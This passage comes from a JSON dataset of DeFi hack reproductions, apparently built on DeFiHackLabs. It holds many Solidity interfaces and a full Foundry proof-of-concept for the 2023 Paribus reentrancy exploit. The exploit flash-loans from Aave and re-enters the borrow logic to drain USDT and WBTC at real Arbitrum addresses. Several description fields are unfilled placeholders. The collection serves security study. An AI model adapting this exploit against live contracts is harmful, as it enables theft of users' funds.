                        "content": "interface IBuildFinance {\n  function propose(\n    address _target,\n    uint256 _value,\n    bytes memory _data\n  ) external returns (uint256);\n\n  function vote(uint256 _proposalId, bool _support) external;\n\n  function execute(\n    uint256 _proposalId,\n    address _target,\n    uint256 _value,\n    bytes memory _data\n  ) external payable returns (bytes memory);\n\n  function mint(address account, uint256 amount) external;\n\n  function proposalCount() external returns (int256);\n\n  function state(uint256 proposalId) external returns (uint256);\n}\n",
                        "token_count": 124,
                        "imported": true
                    },
                    {
                        "name": "MultiSig",
                        "content": "interface MultiSig {\n  function confirmTransaction(uint256 transactionId) external;\n\n  function submitTransaction(\n    address destination,\n    uint256 value,\n    bytes memory data\n  ) external returns (uint256 transactionId);\n\n  function getConfirmations(uint256 transactionId)\n  external\n  view\n  returns (address[] memory _confirmations);\n\n  function required() external view returns (uint256);\n}\n",
                        "token_count": 82,
                        "imported": true
                    },
                    {
                        "name": "Flippaz",
                        "content": "interface Flippaz {\n  function bid() external payable;\n\n  function ownerWithdrawAllTo(address toAddress) external;\n}\n",
                        "token_count": 25,
                        "imported": true
                    },
                    {
                        "name": "IDOODLENFTXVault",
                        "content": "interface IDOODLENFTXVault{\n\n  function flashLoan(\n    address receiver,\n    address token,\n    uint256 amount,\n    bytes memory data\n  ) external returns (bool);\n  function redeem(uint256 amount, uint256[] calldata specificIds)\n  external\n  returns (uint256[] calldata);\n  function balanceOf(address account) external view returns (uint256);\n  function mint(\n    uint256[] calldata tokenIds,\n    uint256[] calldata amounts /* ignored for ERC721 vaults */\n  ) external returns (uint256);\n\n}\n",
                        "token_count": 116,
                        "imported": true
                    },
                    {
                        "name": "ISushiSwap",
                        "content": "interface ISushiSwap{\n\n  function swapTokensForExactTokens(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n  function swap(\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address to,\n    bytes memory data\n  ) external;\n}\n",
                        "token_count": 84,
                        "imported": true
                    },
                    {
                        "name": "IOmni",
                        "content": "interface IOmni{\n\n  function supplyERC721(\n    address asset,\n    DataTypes.ERC721SupplyParams[] memory tokenData,\n    address onBehalfOf,\n    uint16 referralCode\n  ) external;\n\n  function withdrawERC721(\n    address asset,\n    uint256[] memory tokenIds,\n    address to\n  ) external returns (uint256);\n  function liquidationERC721(\n    address collateralAsset,\n    address liquidationAsset,\n    address user,\n    uint256 collateralTokenId,\n    uint256 liquidationAmount,\n    bool receiveNToken\n  ) external;\n\n  struct ERC721SupplyParams {\n    uint256 tokenId;\n    bool useAsCollateral;\n  }\n  function borrow(\n    address asset,\n    uint256 amount,\n    uint256 interestRateMode,\n    uint16 referralCode,\n    address onBehalfOf\n  ) external;\n\n  function getUserAccountData(address user)\n  external\n  view\n  returns (\n    uint256 totalCollateralBase,\n    uint256 totalDebtBase,\n    uint256 availableBorrowsBase,\n    uint256 currentLiquidationThreshold,\n    uint256 ltv,\n    uint256 healthFactor,\n    uint256 erc721HealthFactor\n  );\n\n}\n",
                        "token_count": 252,
                        "imported": true
                    },
                    {
                        "name": "DataTypes",
                        "content": "interface DataTypes {\n  struct ERC721SupplyParams {\n    uint256 tokenId;\n    bool useAsCollateral;\n  }\n}\n",
                        "token_count": 25,
                        "imported": true
                    },
                    {
                        "name": "ILib",
                        "content": "interface ILib {\n  function attack() external returns (bool);\n\n  function withdrawAll() external returns (bool);\n}\n",
                        "token_count": 24,
                        "imported": true
                    },
                    {
                        "name": "FToken",
                        "content": "interface FToken {}\n",
                        "token_count": 4,
                        "imported": true
                    },
                    {
                        "name": "IGovernorAlpha",
                        "content": "interface IGovernorAlpha {\n  function propose(address[] memory targets, uint[] memory values, string[] memory signatures, bytes[] memory calldatas, string memory description) external returns (uint);\n  function castVote(uint proposalId, bool support) external;\n  function queue(uint proposalId) external;\n  function execute(uint proposalId) external payable;\n  function state(uint proposalId) external view;\n}\n",
                        "token_count": 83,
                        "imported": true
                    },
                    {
                        "name": "IChain",
                        "content": "interface IChain {\n  function submit (\n    uint32 _dataTimestamp,\n    bytes32 _root,\n    bytes32[] memory _keys,\n    uint256[] memory _values,\n    uint8[] memory _v,\n    bytes32[] memory _r,\n    bytes32[] memory _s\n  ) external;\n}\n",
                        "token_count": 66,
                        "imported": true
                    },
                    {
                        "name": "IFortressPriceOracle",
                        "content": "interface IFortressPriceOracle {\n  function getUnderlyingPrice(FToken fToken) external view returns (uint);\n}\n",
                        "token_count": 25,
                        "imported": true
                    },
                    {
                        "name": "IFTS",
                        "content": "interface IFTS {\n  function approve(address spender, uint rawAmount) external returns (bool);\n  function balanceOf(address account) external view returns (uint);\n}\n",
                        "token_count": 34,
                        "imported": true
                    },
                    {
                        "name": "IfFTS",
                        "content": "interface IfFTS {\n  function mint(uint mintAmount) external returns (uint);\n  function balanceOf(address owner) external view returns (uint256);\n}\n",
                        "token_count": 32,
                        "imported": true
                    },
                    {
                        "name": "IFBep20Delegator",
                        "content": "interface IFBep20Delegator {\n  function getCash() external view returns (uint);\n  function borrow(uint borrowAmount) external returns (uint);\n  function underlying() external returns (address);\n}\n",
                        "token_count": 42,
                        "imported": true
                    },
                    {
                        "name": "IBorrowerOperations",
                        "content": "interface IBorrowerOperations {\n  function openTrove(\n    uint256 _maxFee,\n    uint256 _LUSDAmount,\n    uint256 _ETHAmount,\n    address _upperHint,\n    address _lowerHint,\n    address _frontEndTag\n  ) external;\n}\n",
                        "token_count": 58,
                        "imported": true
                    },
                    {
                        "name": "IARTH",
                        "content": "interface IARTH is IERC20 {}\n",
                        "token_count": 8,
                        "imported": true
                    },
                    {
                        "name": "IARTHUSD",
                        "content": "interface IARTHUSD {\n  function balanceOf(address) external returns (uint256);\n  function approve(address, uint256) external returns (bool);\n}\n",
                        "token_count": 31,
                        "imported": true
                    },
                    {
                        "name": "IVyper",
                        "content": "interface IVyper {\n  function exchange_underlying(int128, int128, uint256, uint256, address) external returns (uint256);\n}\n",
                        "token_count": 30,
                        "imported": true
                    },
                    {
                        "name": "I88mph",
                        "content": "interface I88mph {\n  function init(\n    address newOwner,\n    string memory tokenName,\n    string memory tokenSymbol\n  ) external;\n  function mint(address to, uint256 tokenId) external;\n  function burn(uint256 tokenId) external;\n  function owner() external view returns (address);\n  function ownerOf(uint256 tokenId) external view returns (address);\n}\n",
                        "token_count": 76,
                        "imported": true
                    },
                    {
                        "name": "IBAYCi",
                        "content": "interface IBAYCi {\n  function setApprovalForAll(address operator, bool approved) external;\n  function transferFrom(\n    address from,\n    address to,\n    uint256 tokenId\n  ) external;\n}\n",
                        "token_count": 42,
                        "imported": true
                    },
                    {
                        "name": "INFTXVault",
                        "content": "interface INFTXVault {\n  function redeem(uint256 amount, uint256[] memory specificIds)\n  external\n  returns (uint256[] memory);\n  function flashLoan(\n    address receiver,\n    address token,\n    uint256 amount,\n    bytes memory data\n  ) external returns (bool);\n  function approve(address spender, uint256 amount) external returns (bool);\n  function mint(uint256[] memory tokenIds, uint256[] memory amounts)\n  external\n  returns (uint256);\n}\n",
                        "token_count": 102,
                        "imported": true
                    },
                    {
                        "name": "IAirdrop",
                        "content": "interface IAirdrop {\n  function claimTokens() external;\n}\n",
                        "token_count": 13,
                        "imported": true
                    },
                    {
                        "name": "ILand",
                        "content": "interface ILand {\n  function _burn(\n    address from,\n    address owner,\n    uint256 id\n  ) external;\n  function _numNFTPerAddress(address) external view returns (uint256);\n}\n",
                        "token_count": 44,
                        "imported": true
                    },
                    {
                        "name": "IERC20Metadata",
                        "content": "interface IERC20Metadata is IERC20 {\n  function name() external view returns (string memory);\n  function symbol() external view returns (string memory);\n  function decimals() external view returns (uint8);\n}\n",
                        "token_count": 44,
                        "imported": true
                    },
                    {
                        "name": "IWFTM",
                        "content": "interface IWFTM is IERC20Metadata {\n  event Deposit(address indexed dst, uint wad);\n  event Withdrawal(address indexed src, uint wad);\n  receive() external payable;\n  fallback () external payable;\n  function deposit() external payable;\n  function withdraw(uint wad) external;\n}\n",
                        "token_count": 62,
                        "imported": true
                    },
                    {
                        "name": "IGrimBoostVault",
                        "content": "interface IGrimBoostVault {\n  event NewStratCandidate(address implementation);\n  event UpgradeStrat(address implementation);\n  function want() external view returns (IERC20);\n  function balance() external view returns (uint);\n  function available() external view returns (uint256);\n  function getPricePerFullShare() external view returns (uint256);\n  function depositAll() external;\n  function deposit(uint _amount) external;\n  function earn() external;\n  function withdrawAll() external;\n  function withdraw(uint256 _shares) external;\n  function proposeStrat(address _implementation) external;\n  function upgradeStrat() external;\n  function inCaseTokensGetStuck(address _token) external;\n  function depositFor(address token, uint _amount,address user ) external;\n}\n",
                        "token_count": 158,
                        "imported": true
                    },
                    {
                        "name": "IFlashLoanRecipient",
                        "content": "interface IFlashLoanRecipient {\n  function receiveFlashLoan(\n    IERC20[] memory tokens,\n    uint256[] memory amounts,\n    uint256[] memory feeAmounts,\n    bytes memory userData\n  ) external;\n}\n",
                        "token_count": 46,
                        "imported": true
                    },
                    {
                        "name": "IBeethovenVault",
                        "content": "interface IBeethovenVault {\n  function flashLoan(IFlashLoanRecipient recipient, IERC20[] memory tokens, uint256[] memory amounts, bytes memory userData) external;\n}\n",
                        "token_count": 36,
                        "imported": true
                    },
                    {
                        "name": "IRedactedCartelSafeERC20",
                        "content": "interface IRedactedCartelSafeERC20 {\n  function unFreezeToken () external;\n  function balanceOf(address account) external view returns (uint256);\n  function approve(address spender, uint256 amount) external returns (bool);\n  function allowance(address owner, address spender) external view returns (uint256);\n  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n",
                        "token_count": 84,
                        "imported": true
                    },
                    {
                        "name": "IBadGuysRPFERC721",
                        "content": "interface IBadGuysRPFERC721{\n  function WhiteListMint(bytes32[] calldata _merkleProof, uint256 chosenAmount) external;\n\n  function balanceOf(address owner) external view returns (uint256 balance);\n\n  function flipPauseMinting() external;\n}\n",
                        "token_count": 59,
                        "imported": true
                    },
                    {
                        "name": "IAkutarNFT",
                        "content": "interface IAkutarNFT{\n\n  function processRefunds() external;\n\n  function bid(uint8 amount) external payable;\n\n  function claimProjectFunds() external;\n\n}\n",
                        "token_count": 35,
                        "imported": true
                    },
                    {
                        "name": "IFortubeBank",
                        "content": "interface IFortubeBank {\n    function flashloan( address receiver, address token, uint256 amount, bytes memory params) external;\n    function repay(address token, uint256 repayAmount) external payable returns (uint256);\n    function controller() external returns(address);\n}\n",
                        "token_count": 54,
                        "imported": true
                    },
                    {
                        "name": "IVaultFlipToFlip",
                        "content": "interface IVaultFlipToFlip {\n    function deposit(uint _amount) external;\n    function earned(address account) external view returns (uint);\n    function balanceOf(address account) external view returns (uint);\n    function principalOf(address account) external view returns (uint);\n    function harvest() external returns (uint bounty);\n    function pid() external returns (uint);\n    function getReward() external;\n}\n",
                        "token_count": 81,
                        "imported": true
                    },
                    {
                        "name": "IBunnyZap",
                        "content": "interface IBunnyZap {\n    function zapIn(address _to) external payable;\n    function zapInToken(address _from, uint amount, address _to) external;\n}\n",
                        "token_count": 36,
                        "imported": true
                    },
                    {
                        "name": "IElevenNeverSellVault",
                        "content": "interface IElevenNeverSellVault {\n    function depositAll() external;\n    function emergencyBurn() external;\n    function withdrawAll() external;\n}\n",
                        "token_count": 30,
                        "imported": true
                    },
                    {
                        "name": "IOpyn",
                        "content": "interface IOpyn{\n    function addERC20CollateralOption(\n      uint256 amtToCreate,\n      uint256 amtCollateral,\n      address receiver\n    ) external;\n\n    function exercise(\n      uint256 oTokensToExercise,\n      address payable[] memory vaultsToExerciseFrom\n    ) external payable;\n\n    function removeUnderlying() external;\n}\n",
                        "token_count": 73,
                        "imported": true
                    },
                    {
                        "name": "ICFToken",
                        "content": "interface ICFToken {\n    function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) external;\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n\n}\n",
                        "token_count": 60,
                        "imported": true
                    },
                    {
                        "name": "IDPPOracle",
                        "content": "interface IDPPOracle {\n    function flashLoan(\n        uint256 baseAmount,\n        uint256 quoteAmount,\n        address _assetTo,\n        bytes calldata data\n    ) external;\n}\n",
                        "token_count": 41,
                        "imported": true
                    },
                    {
                        "name": "IDODOCallee",
                        "content": "interface IDODOCallee {\n    // function DVMSellShareCall(\n    //     address sender,\n    //     uint256 burnShareAmount,\n    //     uint256 baseAmount,\n    //     uint256 quoteAmount,\n    //     bytes calldata data\n    // ) external;\n\n    // function DVMFlashLoanCall(\n    //     address sender,\n    //     uint256 baseAmount,\n    //     uint256 quoteAmount,\n    //     bytes calldata data\n    // ) external;\n\n    function DPPFlashLoanCall(\n        address sender,\n        uint256 baseAmount,\n        uint256 quoteAmount,\n        bytes calldata data\n    ) external;\n\n  //   function DSPFlashLoanCall(\n  //       address sender,\n  //       uint256 baseAmount,\n  //       uint256 quoteAmount,\n  //       bytes calldata data\n  //   ) external;\n\n  //   function CPCancelCall(\n  //       address sender,\n  //       uint256 amount,\n  //       bytes calldata data\n  //   ) external;\n\n\t// function CPClaimBidCall(\n  //       address sender,\n  //       uint256 baseAmount,\n  //       uint256 quoteAmount,\n  //       bytes calldata data\n  //   ) external;\n\n  //   function NFTRedeemCall(\n  //       address payable assetTo,\n  //       uint256 quoteAmount,\n  //       bytes calldata\n  //   ) external;\n}\n",
                        "token_count": 302,
                        "imported": true
                    }
                ]
            }
        ]
    },
    {
        "id": "193520f3e5",
        "is_ready": false,
        "content": "### 20230411 Paribus - Reentrancy\n### Lost: $100k\n#### Contract\n[Paribus_exp.sol](src/test/Paribus_exp.sol)\n#### Link Reference\nhttps://twitter.com/Phalcon_xyz/status/1645742620897955842\nhttps://twitter.com/BlockSecTeam/status/1645744655357575170\nhttps://twitter.com/peckshield/status/1645742296904929280",
        "date": "20230411",
        "target": "Paribus",
        "attack_title": "Reentrancy",
        "vuln_desc": "A description of the exposed vulnerability.",
        "poc_explain": "An explaination of how the poc exposes the vulnerability.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://twitter.com/Phalcon_xyz/status/1645742620897955842",
                "content": "content of the link"
            },
            {
                "link": "https://twitter.com/BlockSecTeam/status/1645744655357575170",
                "content": "content of the link"
            },
            {
                "link": "https://twitter.com/peckshield/status/1645742296904929280",
                "content": "content of the link"
            }
        ],
        "data": [
            {
                "contract_path": "src/test/Paribus_exp.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n// @Analysis\n// https://twitter.com/Phalcon_xyz/status/1645742620897955842\n// https://twitter.com/BlockSecTeam/status/1645744655357575170\n// https://twitter.com/peckshield/status/1645742296904929280\n// @TX\n// https://arbiscan.io/tx/0x0e29dcf4e9b211a811caf00fc8294024867bffe4ab2819cc1625d2e9d62390af\n// @Summary\n// a known reentrancy issue from the forked old version of CompoundV2\ninterface CurvePool {\n    function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy) external;\n}\ncontract ContractTest is Test {\n    IERC20 WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);\n    IWFTM WETH = IWFTM(payable(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1));\n    IERC20 USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);\n    ICErc20Delegate pUSDT = ICErc20Delegate(0xD3e323a672F6568390f29f083259debB44C41f41);\n    ICErc20Delegate pWBTC = ICErc20Delegate(0x367351F854506DA9B230CbB5E47332b8E58A1863);\n    ICErc20Delegate pETH = ICErc20Delegate(0x375Ae76F0450293e50876D0e5bDC3022CAb23198);\n    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);\n    IUnitroller unitroller = IUnitroller(0x2130C88fd0891EA79430Fb490598a5d06bF2A545);\n    CurvePool curvePool = CurvePool(0x960ea3e3C7FB317332d990873d354E18d7645590);\n    Exploiter exploiter;\n    uint256 nonce;\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    function setUp() public {\n        cheats.createSelectFork(\"arbitrum\", 79_308_097);\n        cheats.label(address(WBTC), \"WBTC\");\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(WETH), \"WETH\");\n        cheats.label(address(pUSDT), \"pUSDT\");\n        cheats.label(address(pETH), \"pETH\");\n        cheats.label(address(pWBTC), \"pWBTC\");\n        cheats.label(address(aaveV3), \"aaveV3\");\n        cheats.label(address(curvePool), \"curvePool\");\n    }\n    function testExploit() external {\n        payable(address(0)).transfer(address(this).balance);\n        address[] memory assets = new address[](2);\n        assets[0] = address(WETH);\n        assets[1] = address(USDT);\n        uint256[] memory amounts = new uint256[](2);\n        amounts[0] = 200 * 1e18;\n        amounts[1] = 30_000 * 1e6;\n        uint256[] memory modes = new uint[](2);\n        modes[0] = 0;\n        modes[1] = 0;\n        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), \"\", 0);\n        exchangeUSDTWBTC();\n        emit log_named_decimal_uint(\"Attacker WETH balance after exploit\", WETH.balanceOf(address(this)), WETH.decimals());\n    }\n    function executeOperation(address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params) external payable returns (bool) {\n        USDT.approve(address(aaveV3), type(uint256).max);\n        WETH.approve(address(aaveV3), type(uint256).max);\n        USDT.approve(address(pUSDT), type(uint256).max);\n        WBTC.approve(address(pWBTC), type(uint256).max);\n        exploiter = new Exploiter();\n        WETH.transfer(address(exploiter), 100 * 1e18);\n        cheats.label(address(exploiter), \"exploiter\");\n        exploiter.mint();\n        WETH.withdraw(WETH.balanceOf(address(this)));\n        payable(address(pETH)).call{value: address(this).balance}(\"\");\n        pUSDT.mint(USDT.balanceOf(address(this)));\n        address[] memory cTokens = new address[](2);\n        cTokens[0] = address(pETH);\n        cTokens[1] = address(pUSDT);\n        unitroller.enterMarkets(cTokens);\n        pETH.borrow(13_075_471_156_463_824_220);\n        pETH.redeem(pETH.balanceOf(address(this))); // Reentrancy enter point\n        exploiter.redeem();\n        payable(address(WETH)).call{value: address(this).balance}(\"\");\n        return true;\n    }\n    receive() external payable {\n        if (nonce == 2) {\n            pUSDT.borrow(USDT.balanceOf(address(pUSDT)));\n            pWBTC.borrow(WBTC.balanceOf(address(pWBTC)));\n        }\n        nonce++;\n    }\n    function exchangeUSDTWBTC() internal {\n        USDT.approve(address(curvePool), type(uint256).max);\n        WBTC.approve(address(curvePool), type(uint256).max);\n        curvePool.exchange(0, 2, USDT.balanceOf(address(this)), 0);\n        curvePool.exchange(1, 2, WBTC.balanceOf(address(this)), 0);\n    }\n}\ncontract Exploiter is Test {\n    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);\n    ICErc20Delegate pETH = ICErc20Delegate(0x375Ae76F0450293e50876D0e5bDC3022CAb23198);\n    function mint() external payable {\n        WETH.withdraw(WETH.balanceOf(address(this)));\n        payable(address(pETH)).call{value: address(this).balance}(\"\");\n    }\n    function redeem() external payable {\n        pETH.redeem(pETH.balanceOf(address(this)));\n        payable(address(WETH)).call{value: address(this).balance}(\"\");\n        WETH.transfer(msg.sender, WETH.balanceOf(address(this)));\n    }\n    receive() external payable {}\n}",
                "token_count": 1531,
                "interfaces": [
                    {
                        "name": "CurvePool",
                        "content": "interface CurvePool {\n    function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy) external;\n}\n",
                        "token_count": 27,
                        "imported": false
                    },
                    {
                        "name": "CheatCodes",
                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, (who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    },
                    {
                        "name": "IERC20",
                        "content": "interface IERC20 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function decimals() external view returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n  function withdraw(uint256 wad) external;\n  function deposit(uint256 wad) external returns (bool);\n  function owner() external view virtual returns (address);\n}\n",
                        "token_count": 205,
                        "imported": true
                    },
                    {
                        "name": "ICErc20Delegate",
                        "content": "interface ICErc20Delegate {\n  event AccrueInterest(\n    uint256 cashPrior,\n    uint256 interestAccumulated,\n    uint256 borrowIndex,\n    uint256 totalBorrows\n  );\n  event Approval(\n    address indexed owner,\n    address indexed spender,\n    uint256 amount\n  );\n  event Borrow(\n    address borrower,\n    uint256 borrowAmount,\n    uint256 accountBorrows,\n    uint256 totalBorrows\n  );\n  event Failure(uint256 error, uint256 info, uint256 detail);\n  event LiquidateBorrow(\n    address liquidator,\n    address borrower,\n    uint256 repayAmount,\n    address cTokenCollateral,\n    uint256 seizeTokens\n  );\n  event Mint(address minter, uint256 mintAmount, uint256 mintTokens);\n  event NewAdmin(address oldAdmin, address newAdmin);\n  event NewComptroller(address oldComptroller, address newComptroller);\n  event NewMarketInterestRateModel(\n    address oldInterestRateModel,\n    address newInterestRateModel\n  );\n  event NewPendingAdmin(address oldPendingAdmin, address newPendingAdmin);\n  event NewReserveFactor(\n    uint256 oldReserveFactorMantissa,\n    uint256 newReserveFactorMantissa\n  );\n  event Redeem(address redeemer, uint256 redeemAmount, uint256 redeemTokens);\n  event RepayBorrow(\n    address payer,\n    address borrower,\n    uint256 repayAmount,\n    uint256 accountBorrows,\n    uint256 totalBorrows\n  );\n  event ReservesAdded(\n    address benefactor,\n    uint256 addAmount,\n    uint256 newTotalReserves\n  );\n  event ReservesReduced(\n    address admin,\n    uint256 reduceAmount,\n    uint256 newTotalReserves\n  );\n  event Transfer(address indexed from, address indexed to, uint256 amount);\n\n  function _acceptAdmin() external returns (uint256);\n\n  function _addReserves(uint256 addAmount) external returns (uint256);\n\n  function _becomeImplementation(bytes memory data) external;\n\n  function _delegateCompLikeTo(address 